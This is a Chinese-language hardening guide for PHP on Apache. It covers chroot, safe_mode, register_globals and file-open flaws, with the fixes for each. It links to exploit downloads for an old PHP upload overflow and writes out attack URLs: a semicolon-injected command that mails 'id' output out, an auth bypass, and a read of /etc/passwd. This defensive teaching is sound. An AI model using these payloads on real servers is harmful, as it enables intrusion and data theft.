一、Web
Web
Web
Web 服务器安全
PHP 其实不过是 Web 服务器的一个模块功能，所以首先要保证 Web 服务器的安全。当然
Web 服务器要安全又必须是先保证系统安全，这样就扯远了， 无穷无尽。PHP 可以和各种
Web 服务器结合，这里也只讨论 Apache。非常建议以 chroot 方式安装启动 Apache，这样即
使 Apache 和 PHP 及其脚本出现漏洞，受影响的也只有这个禁锢的系统，不会危害实际系
统。但是使用 chroot 的 Apache 后，给应用也会带来一定的麻烦，比如连接 mysql 时必须用
127.0.0.1地址使用 tcp 连接而不能用 localhost 实现 socket 连接，这在效率上会稍微差一点。
还有 mail 函数发 送邮件也是个问题，因为 php.ini 里的：
[mail function]
; For Win32 only.
SMTP = localhost
; For Win32 only.
sendmail_from = PI:EMAIL
都是针对 Win32平台，所以需要在 chroot 环境下调整好 sendmail。
二、PHP
PHP
PHP
PHP 本身问题
1、远程溢出
PHP-4.1.2以下的所有版本都存在文件上传远程缓冲区溢出漏洞，而且攻击程序已经广泛流
传，成功率非常高：
http://packetstormsecurity.org/0204-exploits/7350fun
http://hsj.shadowpenguin.org/misc/php3018_exp.txt
2、远程拒绝服务
PHP-4.2.0和 PHP-4.2.1存在 PHP multipart/form-data POST 请求处理远程漏洞，虽然不能获得
本地用户权限，但是也能造成拒绝服务。
3、safe_mode 绕过漏洞
还有 PHP-4.2.2以下到 PHP-4.0.5版本都存在 PHP mail 函数绕过 safe_mode 限制执行命令漏
洞，4.0.5版本开始 mail 函数增加了第五个参数，由于设计者考虑不周可以突破 safe_mode 的
限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加 shell 命令就可以了，
比如存在 PHP 脚本 evil.php：
执行如下的 URL：
http://foo.com/evil.php?bar=;/usr/bin/id|mail PI:EMAIL
这将 id 执行的结果发送给 PI:EMAIL。
对于4.0.6至4.2.2的 PHP 突破 safe_mode 限制其实是利用了 sendmail 的-C 参数，所以系统必
须是使用 sendmail。如下的代码能够突破 safe_mode 限制执行命令：
还是使用以上有问题版本 PHP 的用户一定要及时升级到最新版本，这样才能消除基本的安
全问题。
三、PHP
PHP
PHP
PHP 本身的安全配置
PHP 的配置非常灵活，可以通过 php.ini, httpd.conf, .htaccess 文件（该目录必须设置了
AllowOverride All 或 Options）进行设置，还可以在脚本程序里使用 ini_set()及其他的特定的
函数进行设置。通过 phpinfo()和 get_cfg_var()函数可以得到配置选项的各个值。
如果配置选项是唯一 PHP_INI_SYSTEM 属性的，必须通过 php.ini 和 httpd.conf 来修改，它
们修改的是 PHP 的 Master 值，但修改之后必须重启 apache 才能生效。其中 php.ini 设置的
选项是对 Web 服务器所有脚本生效，httpd.conf 里设置的选项是对该定义 的目录下所有脚
本生效。
如果还有其他的 PHP_INI_USER, PHP_INI_PERDIR, PHP_INI_ALL 属性的选项就可以使
用.htaccess 文件设置，也可以通过在脚本程序自身用 ini_set()函数设定，它们修改的是 Local
值，改了以后马上生效。但是.htaccess 只对当前目录的脚本程序生效，ini_set()函数只对该
脚本程序设置 ini_set()函数 以后的代码生效。各个版本的选项属性可能不尽相同，可以用
如下命令查找当前源代码的 main.c 文件得到所有的选项，以及它的属性：
# grep PHP_INI_ /PHP_SRC/main/main.c
在讨论 PHP 安全配置之前，应该好好了解 PHP 的 safe_mode 模式。
1、safe_mode
safe_mode 是唯一 PHP_INI_SYSTEM 属性，必须通过 php.ini 或 httpd.conf 来设置。要启用
safe_mode，只需修改 php.ini：
safe_mode = On
或者修改 httpd.conf，定义目录：
Options FollowSymLinks
php_admin_value safe_mode 1
重启 apache 后 safe_mode 就生效了。启动 safe_mode，会对许多 PHP 函数进行限制，特别是
和系统相关的文件打开、命令执行等函数。
所有操作文件的函数将只能操作与脚本 UID 相同的文件，比如 test.php 脚本的内容为：
几个文件的属性如下：
# ls -la
total 13
drwxr-xr-x 2 root root 104 Jul 20 01:25 .
drwxr-xr-x 16 root root 384 Jul 18 12:02 ..
-rw-r--r-- 1 root root 4110 Oct 26 2002 index.html
-rw-r--r-- 1 www-data www-data 41 Jul 19 19:14 test.php
在浏览器请求 test.php 会提示如下的错误信息：
Warning: SAFE MODE Restriction in effect. The script whose uid/gid is 33/33 is not allowed to
access ./index.html owned by uid/gid 0/0 in /var/www/test.php on line 1
如果被操作文件所在目录的 UID 和脚本 UID 一致，那么该文件的 UID 即使和脚本不同也可
以访问的，不知这是否是 PHP 的一个漏洞还是另有隐情。所 以 php 脚本属主这个用户最好
就只作这个用途，绝对禁止使用 root 做为 php 脚本的属主，这样就达不到 safe_mode 的效果
了。
如果想将其放宽到 GID 比较，则打开 safe_mode_gid 可以考虑只比较文件的 GID，可以设
置如下选项：
safe_mode_gid = On
设置了safe_mode以后，所有命令执行的函数将被限制只能执行php.ini 里safe_mode_exec_dir
指定目录里的程序，而且 shell_exec、`ls -l`这种执行命令的方式会被禁止。如果确实需要调
用其它程序，可以在 php.ini 做如下设置：
safe_mode_exec_dir = /usr/local/php/exec
然后拷贝程序到该目录，那么 php 脚本就可以用 system 等函数来执行该程序。而且该目录
里的 shell 脚本还是可以调用其它目录里的系统命令。
safe_mode_include_dir string
当从此目录及其子目录（目录必须在 include_path 中或者用完整路径来包含）包含文件时
越过 UID/GID 检查。
从 PHP 4.2.0 开始，本指令可以接受和 include_path 指令类似的风格用分号隔开的路径，
而不只是一个目录。
指定的限制实际上是一个前缀，而非一个目录名。这也就是说“safe_mode_include_dir =
/dir/incl”将允许访问“/dir/include”和“/dir/incls”，如果它们存在。如果您希望将访问控制在一
个指定的目录，那么请 在结尾加上一个斜线，例如：“safe_mode_include_dir = /dir/incl/”。
safe_mode_allowed_env_vars string
设置某些环境变量可能是潜在的安全缺口。本指令包含有一个逗号分隔的前缀列表。在安全
模式下，用户只能改变那些名字具有在这里提供的前缀的环境变量。默认情况下，用户只能
设置以 PHP_ 开头的环境变量（例如 PHP_FOO = BAR）。
注: 如果本指令为空，PHP 将使用户可以修改任何环境变量！
safe_mode_protected_env_vars string
本指令包含有一个逗号分隔的环境变量的列表，最终用户不能用 putenv() 来改变这些环境
变量。甚至在 safe_mode_allowed_env_vars 中设置了允许修改时也不能改变这些变量。
虽然 safe_mode 不是万能的（低版本的 PHP 可以绕过），但还是强烈建议打开安全模式，在
一定程度上能够避免一些未知的攻击。不过启用 safe_mode 会有很多限制，可能对应用带
来影响，所以还需要调整代码和配置才能和谐。被安全模式限制或屏蔽的函数可以参考 PHP
手册。
讨论完 safe_mode 后，下面结合程序代码实际可能出现的问题讨论如何通过对 PHP 服务器
端的配置来避免出现的漏洞。
2、变量滥用
PHP 默认 register_globals = On，对于 GET, POST, Cookie, Environment, Session 的变量可以直
接注册成全局变量。它们的注册顺序是 variables_order = "EGPCS"（可以通过 php.ini 修改），
同名变量 variables_order 右边的覆盖左边，所以变量的滥用极易造成程序的混乱。而且脚本
程 序员往往没有对变量初始化的习惯，像如下的程序片断就极易受到攻击：
攻击者只需用如下的请求就能绕过检查：
http://victim/test_1.php?auth=1
这虽然是一个很弱智的错误，但一些著名的程序也有犯过这种错误，比如 phpnuke 的远程文
件拷贝漏洞 http://www.securityfocus.com/bid/3361
PHP-4.1.0发布的时候建议关闭 register_globals，并提供了7个特殊的数组变量来使用各种变
量。对于从 GET、POST、 COOKIE 等来的变量并不会直接注册成变量，必需通过数组变
量来存取。PHP-4.2.0发布的时候，php.ini 默认配置就是 register_globals = Off。这使得程序
使用 PHP 自身初始化的默认值，一般为0，避免了攻击者控制判断变量。
解决方法：
配置文件 php.ini 设置 register_globals = Off。
要求程序员对作为判断的变量在程序最开始初始化一个值。
3、文件打开
极易受攻击的代码片断：
\n");
exit;
}
else {
echo $str;
}
?>
由于攻击者可以指定任意的$filename，攻击者用如下的请求就可以看到/etc/passwd：
http://victim/test_2.php?filename=/etc/passwd
如下请求可以读 php 文件本身：
http://victim/test_2.php?filename=test_2.php
PHP 中文件打开函数还有 fopen(), file()等，如果对文件名变量检查不严就会造成服务器重要
文件被访问读取。
解决方法：
如非特殊需要，把 php 的文件操作限制在 web 目录里面。以下是修改 apache 配置文件
httpd.conf 的一个例子：
php_admin_value open_basedir /usr/local/apache/htdocs